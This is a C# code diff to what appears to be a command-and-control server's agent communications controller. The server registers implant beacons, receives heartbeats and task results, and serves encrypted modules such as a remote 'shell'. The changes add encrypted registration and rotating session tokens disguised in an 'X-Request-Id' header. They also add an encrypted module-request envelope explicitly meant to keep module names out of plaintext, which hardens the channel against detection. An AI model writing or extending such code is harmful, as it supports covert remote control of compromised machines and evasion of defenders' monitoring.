@@ -37,8 +37,51 @@ public class AgentCommsController : ControllerBase
     }
 
     [HttpPost("register")]
-    public async Task<IActionResult> Register([FromBody] RegisterRequest request)
+    public async Task<IActionResult> Register([FromBody] JsonElement? body)
     {
+        // The registration handshake may be encrypted with a pre-session AES
+        // key derived from the shared beacon secret (SHA-256). Decrypt first,
+        // then treat the payload exactly like the legacy plaintext body.
+        RegisterRequest? request = null;
+        var encrypted = false;
+        if (body is { } el && el.TryGetProperty("payload", out var p) && p.GetString() is string payload)
+        {
+            var secret = _beaconSettings.Secret;
+            if (string.IsNullOrEmpty(secret))
+                return BadRequest(new { error = "encrypted registration requires a configured beacon secret" });
+
+            try
+            {
+                var plain = CryptoHelper.DecryptPayload(payload, CryptoHelper.DerivePreSessionKey(secret));
+                request = JsonSerializer.Deserialize<RegisterRequest>(plain, new JsonSerializerOptions
+                {
+                    PropertyNameCaseInsensitive = true
+                });
+            }
+            catch (Exception)
+            {
+                return Unauthorized(new { error = "registration decrypt failed" });
+            }
+            encrypted = true;
+        }
+        else if (body is { } plainEl)
+        {
+            try
+            {
+                request = plainEl.Deserialize<RegisterRequest>(new JsonSerializerOptions
+                {
+                    PropertyNameCaseInsensitive = true
+                });
+            }
+            catch (JsonException)
+            {
+                return BadRequest(new { error = "invalid registration body" });
+            }
+        }
+
+        if (request == null)
+            return BadRequest(new { error = "invalid registration body" });
+
         if (string.IsNullOrWhiteSpace(request.Hostname))
             return BadRequest(new { error = "hostname required" });
 
@@ -56,11 +99,16 @@ public class AgentCommsController : ControllerBase
         // Establish AES-256 session key (RSA-OAEP encrypted with the agent's public key).
         var sessionKey = _commsService.EstablishSessionKey(agent.Id, request.PublicKey, request.HasSessionKey);
 
+        // Opaque per-session channel token: replaces the stable agent id on the
+        // wire for all subsequent requests. Rotates on every registration.
+        var sessionToken = _commsService.IssueSessionToken(agent.Id);
+
         var profile = await _commsService.GetActiveProfileAsync();
         var response = new
         {
             agent_id = agent.Id,
             session_key = sessionKey,
+            session_token = sessionToken,
             heartbeat_url = profile.GetHeartbeatUrl("/api/beacon"),
             result_url = profile.GetResultUrl("/api/beacon"),
             ws_url = profile.GetWebSocketUrl(""),
@@ -97,7 +145,7 @@ public class AgentCommsController : ControllerBase
     [HttpPost("heartbeat")]
     public async Task<IActionResult> Heartbeat([FromBody] JsonElement? body)
     {
-        var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
+        var agentId = ResolveAgentId(Request);
         if (string.IsNullOrEmpty(agentId))
             return BadRequest(new { error = "missing agent id" });
 
@@ -155,7 +203,7 @@ public class AgentCommsController : ControllerBase
     [HttpPost("result")]
     public async Task<IActionResult> SubmitResult([FromBody] JsonElement? body)
     {
-        var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
+        var agentId = ResolveAgentId(Request);
         if (string.IsNullOrEmpty(agentId))
             return BadRequest(new { error = "missing agent id" });
 
@@ -191,14 +239,62 @@ public class AgentCommsController : ControllerBase
     }
 
     /// <summary>
+    /// Serve a cloud module to an authenticated agent via an encrypted envelope.
+    /// The request is `{ "payload": AES-GCM({"name":"shell"}) }` so no module
+    /// name appears in plaintext. The module binary is encrypted with the
+    /// agent's session key on the fly.
+    /// </summary>
+    [HttpPost("module")]
+    public async Task<IActionResult> DownloadModuleEnvelope([FromBody] JsonElement? body)
+    {
+        var agentId = ResolveAgentId(Request);
+        if (string.IsNullOrEmpty(agentId))
+            return BadRequest(new { error = "missing agent id" });
+
+        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
+            return Unauthorized(new { error = "session not established" });
+
+        if (body is not { } el || !el.TryGetProperty("payload", out var p) || p.GetString() is not string payload)
+            return BadRequest(new { error = "missing payload" });
+
+        string requestJson;
+        try
+        {
+            requestJson = CryptoHelper.DecryptPayload(payload, key);
+        }
+        catch (Exception)
+        {
+            return Unauthorized(new { error = "decrypt failed" });
+        }
+
+        string? name = null;
+        try
+        {
+            using var doc = JsonDocument.Parse(requestJson);
+            if (doc.RootElement.TryGetProperty("name", out var n))
+                name = n.GetString();
+        }
+        catch (JsonException)
+        {
+            return BadRequest(new { error = "invalid payload" });
+        }
+
+        if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
+            return BadRequest(new { error = "invalid module name" });
+
+        return await ServeModuleAsync(agentId, name, key);
+    }
+
+    /// <summary>
     /// Serve a cloud module (e.g. "shell") to an authenticated agent. The module
     /// binary is encrypted with the agent's session key on the fly. Modules are
     /// resolved from the platform directory matching the agent's own platform.
+    /// Legacy GET form — superseded by the encrypted POST envelope.
     /// </summary>
     [HttpGet("module/{name}")]
     public async Task<IActionResult> DownloadModule(string name)
     {
-        var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
+        var agentId = ResolveAgentId(Request);
         if (string.IsNullOrEmpty(agentId))
             return BadRequest(new { error = "missing agent id" });
 
@@ -208,6 +304,11 @@ public class AgentCommsController : ControllerBase
         if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
             return BadRequest(new { error = "invalid module name" });
 
+        return await ServeModuleAsync(agentId, name, key);
+    }
+
+    private async Task<IActionResult> ServeModuleAsync(string agentId, string name, byte[] key)
+    {
         // Resolve the agent's platform so the correct artifact set is served.
         var platform = await ResolveAgentPlatformAsync(agentId);
         if (platform == null)
@@ -230,6 +331,23 @@ public class AgentCommsController : ControllerBase
         var bytes = System.IO.File.ReadAllBytes(modulePath);
         var payload = CryptoHelper.EncryptBytes(bytes, key);
         return Ok(new { payload });
+    }
+
+    /// <summary>
+    /// Resolve the beacon's identity: prefer the opaque per-session channel
+    /// token (`X-Request-Id`), fall back to the legacy stable agent id
+    /// (`X-Agent-Id`) for pre-token agents.
+    /// </summary>
+    private string? ResolveAgentId(HttpRequest request)
+    {
+        var token = request.Headers["X-Request-Id"].FirstOrDefault();
+        if (!string.IsNullOrEmpty(token))
+        {
+            if (_commsService.TryResolveSessionToken(token, out var agentId) && !string.IsNullOrEmpty(agentId))
+                return agentId;
+            return null; // Unknown token — do NOT fall back, tokens are authoritative when present.
+        }
+        return request.Headers["X-Agent-Id"].FirstOrDefault();
     }
 
     private async Task<string?> ResolveAgentPlatformAsync(string agentId)
